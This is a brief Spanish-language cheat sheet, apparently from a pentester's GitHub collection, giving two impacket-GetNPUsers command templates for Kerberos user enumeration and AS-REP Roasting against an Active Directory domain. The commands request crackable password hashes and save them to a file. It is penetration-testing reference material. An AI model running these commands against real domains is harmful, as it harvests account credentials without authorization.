# mpacket-GetNPUsers Cheat Sheet

#### Ataque TGT usando un archivo de listado de posbles usuarios
```
impacket-GetNPUsers <DOMAIN>/ -no-pass -usersfile <FILE-USERS>
```

#### ASRepRoast Attack - con usuario y contraseña que tengamos
```
impacket-GetNPUsers -dc-ip <IP> -request -outputfile hashes.asreproast <DOMAIN>/<USER>
```

---

[:arrow_left: Regresar](https://github.com/m4lal0/cheatsheets)